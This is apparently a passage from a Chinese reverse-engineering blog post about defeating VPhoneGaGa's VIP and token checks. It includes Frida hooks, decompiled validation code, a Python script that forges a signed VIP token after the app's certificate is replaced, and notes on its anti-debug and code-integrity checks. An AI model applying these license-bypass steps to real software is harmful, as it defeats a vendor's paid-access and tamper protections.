pid uid gid</span></span><br><span class="line">    <span class="keyword">if</span> (getsockopt === <span class="literal">undefined</span>)</span><br><span class="line">        getsockopt = <span class="keyword">new</span> NativeFunction(Module.findExportByName(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;getsockopt&#x27;</span>), <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line">    <span class="keyword">let</span> addr = Memory.alloc(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">let</span> len = Memory.alloc(<span class="number">4</span>).writeUInt(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">let</span> ret = getsockopt(fd, <span class="number">1</span>, <span class="number">17</span>, addr, len)</span><br><span class="line">    <span class="keyword">if</span> (ret !== <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`getSocketTarget: getsockopt fails: <span class="subst">$&#123;ret&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(addr.readByteArray(<span class="number">12</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它得到了对端的pid，uid和gid。<code>ps -A | grep &lt;pid&gt;</code>查看进程名称，结果为<code>titan64_0:kernel</code>。 用IDA附加到此进程，发现里面没有<code>libVPhoneGaGaLib.so</code>，只有<code>libuserkernel64.so</code>。那么对端的代码应该就在这个so里面了。经过寻找，最后找到了关键函数：<code>titan::dev_input::on_input_event_callback(0xA7648)</code>，这个函数循环接收数据包，然后调用<code>process_input(0xA785C)</code>，名字随便起的：</p><p><img src="/pictures/VPhone-Reverse/14.png" alt="输入接收函数"></p><p>这里推测29-31行是验证逻辑，因为我对比了2.3.1老版本的同名函数（2.3.1版本还没有这么多奇怪的验证，它在过完前面两个验证后是能接收触摸事件的），确认这几行是新加上来的。然后Ctrl+F5导出所有代码，搜索<code>+ 3605</code>等字样，筛选出给它赋值的，最终定位到了<code>titan::kernel::on_network_event(0xECD20)</code>。这个函数是另一个socket的接收端，它负责与<code>libVPhoneGaGaLib.so</code>通信<del>注意这个函数中有一个巨大的<code>switch-case</code>，以后会考(</del>。于是我们又回到<code>libVPhoneGaGaLib.so</code>中来。</p><p>使用frida记录<code>pipe_stream::write_fully(0x27369C)</code>的所有调用，打印他们的文件描述符对应的socket name（如果有）和<code>lr</code>寄存器（函数调用方），最后定位到了<code>HwNetwork::SendPacket(0x244FC8)</code>处，名字随便起的。对此函数查看交叉引用，能定位到好几个函数。经过分析，我发现发送的数据包有如下格式：</p><ul><li><p>一个四字节的<code>ETEN</code>头（魔法值）</p></li><li><p>一个四字节整数，标识数据包的类型，取值为1-8共八种</p></li><li><p>一个八字节整数，存放数据主体的长度</p></li><li><p>数据主体，定义与数据包类型有关</p></li></ul><p>对<code>libuserkernel64.so</code>中的<code>switch-case</code>进行分析，类型7应该是我们想要的。于是在<code>libVPhoneGaGaLib.so</code>中找到了发送这种数据包的函数： <code>xxxSaveUserVipInfo(0x245A00)</code>，名字随便起的。对此函数查看交叉引用，有<code>Engine::SetUserLogin(0x169F2C)</code>等共三个函数，另两个对逆向作用不大暂时忽略。分析<code>Engine::SetUserLogin</code>函数，这个函数会把Java层中<code>Lcom/vphonegaga/titan/user/User;</code>类的一个实例的<code>uid</code>、<code>token</code>、<code>token2</code>、<code>uuid</code>字段读到<code>Engine</code>中保存。于是<code>xxxSaveUserVipInfo</code>函数的参数就水落石出了：</p><ul><li><p><code>void *this</code>，推断是<code>HwNetwork</code>类</p></li><li><p><code>bool bLogin</code>，是否登录</p></li><li><p><code>const char *uid</code>，用户uid</p></li><li><p><code>const char *token2</code>，一个token</p></li><li><p><code>const char *uuid</code>，暂时不清楚有什么用</p></li><li><p><code>const void *sign1</code>，JNI调用<code>Landroid/content/pm/PackageInfo</code>获取的签名信息</p></li><li><p><code>unsigned sign1len</code></p></li><li><p><code>const void *sign2</code>，解析ZIP包中的<code>META-INF/[\w]+\.RSA</code>（正则表达式匹配一个结果）获取的签名信息</p></li><li><p><code>unsigned sign2len</code></p></li></ul><p>数据包的信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">size: 3180</span><br><span class="line">0000-0004 &#x27;ETEN&#x27;</span><br><span class="line">0004-0008 kind: 7</span><br><span class="line">0008-0016 packLen: 3164</span><br><span class="line">0016-0020 bLogin</span><br><span class="line">0020-0036 uid</span><br><span class="line">0036-1060 token2</span><br><span class="line">1060-1124 uuid</span><br><span class="line">1124-1128 sign1Len</span><br><span class="line">1128-2152 sign1</span><br><span class="line">2152-2156 sign2Len</span><br><span class="line">2156-3180 sign2</span><br></pre></td></tr></table></figure><p>把这一结果对应到socket的接收端<code>case 7</code>处，就知道<code>process_input</code>中检验的是什么了。</p><blockquote><p>这里有个小插曲：虽然发送的数据包中有两种签名信息，但实际上对端<code>memcmp</code>比较两种签名的差异时，并没有保存成功与否的信息，只是把结果log了一下，可能是因为正常情况下两种数据的确是有些差异的，所以即使是正版应用这个校验也不会通过，猜测他们的源码中把验证失败的操作注释掉了，所以才有这一奇怪现象。</p><p>不能保证这种验证会出现在未来的版本中。</p></blockquote><p><code>process_input</code>的验证逻辑是检测是否登录、<code>token2</code>是否为空，第31行不知道，但经测试与验证无关？接下来就简单了，回到Java层，<code>token2</code>随便给个值就好了。</p><h2 id="Native层—Token和代码段验证"><a href="#Native层—Token和代码段验证" class="headerlink" title="Native层—Token和代码段验证"></a>Native层—Token和代码段验证</h2><p>再次打包运行，结果是，应用终于能接收输入了，但是运行大概5分钟后，应用又无法接收输入，而且与之前不同，这次连悬浮窗中的“展开通知栏”也没用了。这又双叒叕是一个验证，不过好在这次的验证点比较好找，就在<code>titan::kernel::on_network_event</code>函数<code>case 7</code>下面的<code>case 8</code>。这里判断了<code>uid</code>和<code>token</code>是否为空，然后调用了函数<code>isUidValid(0x18B150)</code>（名字随便起的）用于验证，过程就不展开说了，下面是代码修复结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">isUidValid</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> lentoken2; <span class="comment">// w0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> _uid; <span class="comment">// w20</span></span><br><span class="line">  <span class="keyword">void</span> *base64_vt; <span class="comment">// x0</span></span><br><span class="line">  _QWORD *base64; <span class="comment">// x20</span></span><br><span class="line">  __int64 tokenbuf; <span class="comment">// x0</span></span><br><span class="line">  _QWORD *tokendbuf; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> tokendatalen; <span class="comment">// w21</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// x0</span></span><br><span class="line">  __int64 buffer; <span class="comment">// x20</span></span><br><span class="line">  __int64 rsa; <span class="comment">// x21</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> blocksize; <span class="comment">// w22</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// w8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 current; <span class="comment">// x26</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> remain; <span class="comment">// w8</span></span><br><span class="line">  __int64 v16; <span class="comment">// x0</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// w0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v18; <span class="comment">// x23</span></span><br><span class="line">  __int64 v19; <span class="comment">// x28</span></span><br><span class="line">  __int64 v21; <span class="comment">// x8</span></span><br><span class="line">  __int64 v23; <span class="comment">// [xsp+0h] [xbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 expire_time; <span class="comment">// [xsp+8h] [xbp-C8h] BYREF</span></span><br><span class="line">  __int64 token_time; <span class="comment">// [xsp+10h] [xbp-C0h] BYREF</span></span><br><span class="line">  __int64 v26; <span class="comment">// [xsp+18h] [xbp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> tv; <span class="comment">// [xsp+20h] [xbp-B0h] OVERLAPPED BYREF</span></span><br><span class="line">  _DWORD tv_4[<span class="number">7</span>]; <span class="comment">// [xsp+24h] [xbp-ACh] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *tokendata; <span class="comment">// [xsp+40h] [xbp-90h] BYREF</span></span><br><span class="line">  __int64 v30; <span class="comment">// [xsp+48h] [xbp-88h]</span></span><br><span class="line">  _BYTE v31[<span class="number">16</span>]; <span class="comment">// [xsp+50h] [xbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *tokendatab64; <span class="comment">// [xsp+60h] [xbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> tokendatab64len; <span class="comment">// [xsp+68h] [xbp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> uid; <span class="comment">// [xsp+78h] [xbp-58h] OVERLAPPED BYREF</span></span><br><span class="line">  <span class="keyword">int</span> isVip; <span class="comment">// [xsp+7Ch] [xbp-54h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*(_BYTE *)(a1 + <span class="number">3605</span>) || !*(_BYTE *)(a1 + <span class="number">3640</span>) )<span class="comment">// not login or token2 is &#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  tokendatab64len = <span class="number">0LL</span>;</span><br><span class="line">  tokendatab64 = <span class="number">0LL</span>;</span><br><span class="line">  lentoken2 = strnlen((<span class="keyword">const</span> <span class="keyword">char</span> *)(a1 + <span class="number">3640</span>), <span class="number">0x400</span>uLL);</span><br><span class="line">  _uid = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (lentoken2 &amp; <span class="number">0xFFFFFC00</span>) != <span class="number">0</span> || lentoken2 &lt; <span class="number">0x21</span> )<span class="comment">// 32 &lt; len &lt; 1024</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">  alloc((__int64)&amp;tokendatab64, lentoken2 - <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(tokendatab64, (<span class="keyword">const</span> <span class="keyword">void</span> *)(a1 + <span class="number">3672</span>), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)tokendatab64len);</span><br><span class="line">  v30 = <span class="number">0LL</span>;</span><br><span class="line">  tokendata = <span class="number">0LL</span>;</span><br><span class="line">  base64_vt = sub_1B1094();</span><br><span class="line">  base64 = (_QWORD *)cipher_init((__int64)base64_vt);</span><br><span class="line">  cipher_addflag((__int64)base64, <span class="number">256</span>);</span><br><span class="line">  tokenbuf = cipher_memory2buffer((<span class="keyword">const</span> <span class="keyword">char</span> *)tokendatab64, tokendatab64len);</span><br><span class="line">  tokendbuf = cipher_decrypt(base64, tokenbuf);</span><br><span class="line">  alloc((__int64)&amp;tokendata, tokendatab64len);</span><br><span class="line">  tokendatalen = cipher_buffer2memory((__int64)tokendbuf, (__int64)tokendata, v30);</span><br><span class="line">  cipher_bufferclear((__int64)tokendbuf);</span><br><span class="line">  <span class="keyword">if</span> ( tokendatalen &gt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alloc((__int64)&amp;tokendatab64, tokendatalen);</span><br><span class="line">    <span class="built_in">memcpy</span>(tokendatab64, tokendata, tokendatalen);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( tokendata )</span><br><span class="line">    <span class="keyword">operator</span> <span class="keyword">delete</span>[](tokendata);</span><br><span class="line">  v30 = <span class="number">0xF00000000</span>LL;</span><br><span class="line">  tokendata = v31;</span><br><span class="line">  v31[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v9 = sub_1AC230();</span><br><span class="line">  buffer = cipher_init((__int64)v9);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cipher_bufferload(buffer, (__int64)&amp;unk_321196, <span class="number">550u</span>) == <span class="number">550</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)&amp;tv_4[<span class="number">1</span>] = <span class="number">0xF00000000</span>LL;</span><br><span class="line">    *(_QWORD *)&amp;tv = &amp;tv_4[<span class="number">3</span>];</span><br><span class="line">    rsa = sub_1C04F8(buffer, <span class="number">0LL</span>);</span><br><span class="line">    LOBYTE(tv_4[<span class="number">3</span>]) = <span class="number">0</span>;</span><br><span class="line">    v26 = <span class="number">0LL</span>;</span><br><span class="line">    token_time = <span class="number">0LL</span>;</span><br><span class="line">    blocksize = sub_1BB5A8(rsa);                <span class="comment">// 0x200</span></span><br><span class="line">    sub_73858((__int64)&amp;token_time, blocksize + <span class="number">1</span>);</span><br><span class="line">    v13 = tokendatab64len;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)tokendatab64len )</span><br><span class="line">    &#123;</span><br><span class="line">      current = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        remain = v13 - current;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">int</span>)remain &lt;= (<span class="keyword">int</span>)blocksize )</span><br><span class="line">          v16 = remain;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v16 = blocksize;</span><br><span class="line">        v17 = sub_1BB624(v16, (__int64)tokendatab64 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)current, token_time, rsa);<span class="comment">// 1BCF50</span></span><br><span class="line">        <span class="keyword">if</span> ( v17 &gt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_BYTE *)(token_time + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v17) = <span class="number">0</span>;</span><br><span class="line">          v18 = (<span class="keyword">const</span> <span class="keyword">void</span> *)token_time;</span><br><span class="line">          <span class="keyword">if</span> ( *(_BYTE *)token_time )</span><br><span class="line">          &#123;</span><br><span class="line">            v19 = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">while</span> ( *(<span class="keyword">unsigned</span> __int8 *)(token_time + v19++ + <span class="number">1</span>) )</span><br><span class="line">              ;</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_71604((__int64)&amp;tokendata, v30 + v19);</span><br><span class="line">              <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)tokendata + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v30, v18, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v19);</span><br><span class="line">              LODWORD(v30) = v30 + v19;</span><br><span class="line">              *((_BYTE *)tokendata + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v30) = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v13 = tokendatab64len;</span><br><span class="line">        current += (<span class="keyword">int</span>)blocksize;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( current &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)tokendatab64len );</span><br><span class="line">    &#125;</span><br><span class="line">    sub_1BB9CC(rsa);</span><br><span class="line">    <span class="keyword">if</span> ( token_time )</span><br><span class="line">      <span class="keyword">operator</span> <span class="keyword">delete</span>[]((<span class="keyword">void</span> *)token_time);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;tv &amp;&amp; &amp;tv_4[<span class="number">3</span>] != *(_DWORD **)&amp;tv )</span><br><span class="line">      <span class="keyword">operator</span> <span class="keyword">delete</span>[](*(<span class="keyword">void</span> **)&amp;tv);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1AA098(buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !(_DWORD)v30 )</span><br><span class="line">  &#123;</span><br><span class="line">    _uid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;uid = <span class="number">0LL</span>;</span><br><span class="line">  expire_time = <span class="number">0LL</span>;</span><br><span class="line">  token_time = <span class="number">0LL</span>;</span><br><span class="line">  v23 = <span class="number">0LL</span>;</span><br><span class="line">  tv = <span class="number">53</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)tv_4, <span class="string">&quot;%d|%d|%lu|%lu|%lu&quot;</span>);</span><br><span class="line">  _uid = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sscanf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)tokendata, (<span class="keyword">const</span> <span class="keyword">char</span> *)tv_4, &amp;isVip, &amp;uid, &amp;token_time, &amp;expire_time, &amp;v23) != <span class="number">5</span></span><br><span class="line">    || isVip != <span class="number">1</span></span><br><span class="line">    || (_uid = uid) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_39:</span><br><span class="line">    <span class="keyword">if</span> ( !tokendata )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">LABEL_40:</span><br><span class="line">    <span class="keyword">if</span> ( v31 != tokendata )</span><br><span class="line">      <span class="keyword">operator</span> <span class="keyword">delete</span>[](tokendata);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( token_time &lt; expire_time &amp;&amp; _uid == atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)(a1 + <span class="number">3624</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    gettimeofday((struct timeval *)&amp;tv, <span class="number">0LL</span>);   <span class="comment">// current second</span></span><br><span class="line">    v21 = *(_QWORD *)&amp;tv - token_time;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;tv - token_time &lt; <span class="number">0</span> )</span><br><span class="line">      v21 = token_time - *(_QWORD *)&amp;tv;</span><br><span class="line">    _uid = v21 &lt; <span class="number">172800</span>;                        <span class="comment">// 2 day</span></span><br><span class="line">    <span class="keyword">if</span> ( !tokendata )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">  &#125;</span><br><span class="line">  _uid = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( tokendata )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">LABEL_42:</span><br><span class="line">  <span class="keyword">if</span> ( tokendatab64 )</span><br><span class="line">    <span class="keyword">operator</span> <span class="keyword">delete</span>[](tokendatab64);</span><br><span class="line">  <span class="keyword">return</span> _uid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的不同时期变量在栈中会重叠，所以一个变量名可能对应好几种意思。函数的逻辑是，抛开<code>token2</code>的前32字节不谈，<code>base64</code>解密<code>token2</code>剩下的部分，然后用<code>0x321196</code>处的<code>der</code>格式证书中的公钥解密<code>token2</code>，如果解密成功，会得到一个<code>&lt;isVip&gt;|&lt;uid&gt;|&lt;token_timestamp&gt;|&lt;expire_timestamp&gt;|&lt;uuid&gt;</code>格式的字符串，然后应用对这个字符串作进一步的分析。由于是RSA，私钥没办法获取，所以必须把<code>0x321196</code>处的证书替换成我们自己的。</p><blockquote><p>Q：为什么不直接改代码让这函数返回1？</p><p>A：这里偷了一个懒，如果改.text段，要在三个so中分别找到这个函数的位置，改证书只要调用<code>bytes.find()</code>就可以直接处理三个文件。另一方面，之前修改.text段发现有另一个验证，这个后面再说。</p></blockquote><p>用python生成自己的证书替换掉原证书，然后生成一个我们自己的<code>token2</code>，我发现python<code>Crypto</code>库里面竟然没有私钥加密公钥解密的函数？？？然后自己写了一个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data: <span class="built_in">bytes</span>, key: RSA.RsaKey</span>):</span></span><br><span class="line">    lenkey = (key.n.bit_length() + <span class="number">7</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">    <span class="keyword">assert</span> lenkey &gt; <span class="number">11</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) + <span class="number">11</span> &lt;= lenkey</span><br><span class="line">    datapad = <span class="string">b&#x27;\x00\x01&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * (lenkey - <span class="number">3</span> - <span class="built_in">len</span>(data)) + <span class="string">b&#x27;\x00&#x27;</span> + data</span><br><span class="line">    enc = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(datapad, <span class="string">&#x27;big&#x27;</span>), key.d, key.n)</span><br><span class="line">    <span class="keyword">return</span> enc.to_bytes(lenkey, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data: <span class="built_in">bytes</span>, key: RSA.RsaKey</span>):</span></span><br><span class="line">    lenkey = (key.n.bit_length() + <span class="number">7</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">    <span class="keyword">assert</span> lenkey &gt; <span class="number">11</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) == lenkey</span><br><span class="line">    dec = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(data, <span class="string">&#x27;big&#x27;</span>), key.e, key.n).to_bytes(lenkey, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(dec):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>: <span class="keyword">assert</span> c == <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">1</span>: <span class="keyword">assert</span> c == <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> c != <span class="number">255</span>:</span><br><span class="line">                <span class="keyword">assert</span> c == <span class="number">0</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> dec[i:]</span><br><span class="line"></span><br><span class="line">key = RSA.import_key(<span class="built_in">open</span>(<span class="string">&#x27;new.der&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">key1 = RSA.import_key(<span class="built_in">open</span>(<span class="string">&#x27;export.der&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">raw = <span class="string">b&#x27;1|1|0|2147483647|0&#x27;</span></span><br><span class="line">enc = encrypt(raw, key)</span><br><span class="line"><span class="keyword">assert</span> decrypt(enc, key1) == raw</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;../patch/token.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(<span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span> + b64encode(enc))</span><br></pre></td></tr></table></figure><p>把这个<code>token2</code>放到Java层对应的字段即可。然而重新打包运行发现然并卵。再往后一看，原来后面还有个<code>token2</code>的时间验证，有效期为两天内！于是我们不得不修改.text段了（<del>mmp，证书白做了，<code>isUidValid</code>也白分析了，最终还是得修改.text，逸一时误一世啊</del>），而.text段有另一处验证，没办法继续找吧(＠_＠) 。。。</p><p>继续用日志对比大法，把.text段是否修改作为控制变量，最终找到了这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@1809@@1014@</span><br></pre></td></tr></table></figure><p>根据这个字符串寻找对应的代码，最终找到了<code>xxxVerifyCodeModify(0x13A724)</code>(除了<code>gettime</code>外这里的函数名都是随便起的)：</p><p><img src="/pictures/VPhone-Reverse/15.png" alt="text段验证"></p><p><code>IsDebuggerPresent</code>会读取<code>/proc/self/status</code>中的<code>TracerPid</code>来检测自身是否被调试：</p><p><img src="/pictures/VPhone-Reverse/16.png" alt="检测调试器"></p><p><code>codeNotModified</code>读取参数二指定的文件，对它的.plt和.text段进行MD5校验，然后与参数三进行对比：</p><p><img src="/pictures/VPhone-Reverse/17.png" 